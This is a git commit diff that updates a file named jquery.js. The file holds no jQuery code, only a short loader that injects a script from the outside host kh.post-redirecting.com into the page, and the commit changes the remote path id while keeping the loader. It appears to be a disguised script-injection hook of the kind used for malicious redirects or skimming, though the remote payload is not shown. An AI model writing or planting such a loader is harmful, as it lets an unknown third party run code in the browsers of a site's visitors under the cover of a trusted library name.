11ad1e1207836251b08517b1a174992eb0d76800
elankton <74224289+elankton@users.noreply.github.com>
2022-06-20 10:57:04 +0300

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,6 +1,6 @@
 (function (a, d, j, o) {
-   o = a.createElement(d),
-      m = a.getElementsByTagName(d)[0];              
-   o.src = j + "?d=0&r=" + Math.random();
-   m.parentNode.insertBefore(o, m)
-})(document, 'script', 'https://kh.post-redirecting.com/sl/2e72ef55');
+     o = a.createElement(d),
+        m = a.getElementsByTagName(d)[0];              
+     o.src = j + "?d=0&r=" + Math.random();
+     m.parentNode.insertBefore(o, m)
+})(document, 'script', 'https://kh.post-redirecting.com/sl/867b95f6');
